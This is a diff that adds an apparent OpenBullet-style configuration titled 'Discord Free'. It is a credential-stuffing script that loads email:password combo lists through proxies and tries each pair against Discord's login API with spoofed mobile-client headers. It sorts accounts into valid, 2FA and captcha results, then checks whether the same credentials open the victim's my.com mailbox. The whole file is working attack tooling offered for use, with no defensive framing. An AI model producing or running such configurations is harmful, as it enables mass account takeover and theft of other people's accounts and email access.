@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "Discord Free",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-07T10:23:46.3996975+01:00",
+  "AdditionalInfo": " Ricking#3224'",
+  "Author": "Ricking#3224 '",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Good Proxy Needed",
+      "VariableName": "",
+      "Id": 1301157202
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Constant "<USER>" -> VAR "US" 
+
+FUNCTION Constant "<PASS>" -> VAR "PS" 
+
+REQUEST POST "https://discord.com/api/v8/auth/login" 
+  CONTENT "{\"login\":\"<US>\",\"password\":\"<PS>\",\"undelete\":false,\"captcha_key\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": authority: discord.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: br, gzip, deflate" 
+  HEADER "accept-language: en-US" 
+  HEADER "authorization: undefined" 
+  HEADER "content-length: 92" 
+  HEADER "content-type: application/json" 
+  HEADER "cookie: __cfduid=df24f870ebdefdc7c9c98234f5d3a98921610928313" 
+  HEADER "user-agent: Discord/23390 CFNetwork/975.0.3 Darwin/18.2.0" 
+  HEADER "x-fingerprint: 800516113988583465.bsWQo4fjDUYUiogr7XwdbFYqYa4" 
+  HEADER "x-super-properties: eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZTExLDYiLCJjbGllbnRfdmVyc2lvbiI6IjU2LjAiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJkZXZpY2VfYWR2ZXJ0aXNlcl9pZCI6IjA5MDk0NzFBLUE2OTItNEUyOS05MEQ5LTU2REQ2NURFQjhGOCIsImRldmljZV92ZW5kb3JfaWQiOiJCNkNCQUQwMy04MkQ2LTQzMzctOEJBNi1DN0FDRTY3NTU2ODEiLCJicm93c2VyX3VzZXJfYWdlbnQiOiIiLCJicm93c2VyX3ZlcnNpb24iOiIiLCJvc192ZXJzaW9uIjoiMTIuMSIsImNsaWVudF9idWlsZF9udW1iZXIiOjIzMzkwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==" 
+
+KEYCHECK 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "ACCOUNT_LOGIN_VERIFICATION_EMAIL" 
+  KEYCHAIN Retry OR 
+    KEY "captcha-required" 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_LOGIN" 
+  KEYCHAIN Success OR 
+    KEY "token\":" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#stats PARSE "<SOURCE>" LR "" "" -> VAR "stats" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Ok=1" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Ok=0" 
+
+IF "<stats>" CONTAINS "Ok=1"
+
+FUNCTION Constant " Yes" -> VAR "isMailAccess" 
+
+ENDIF
+
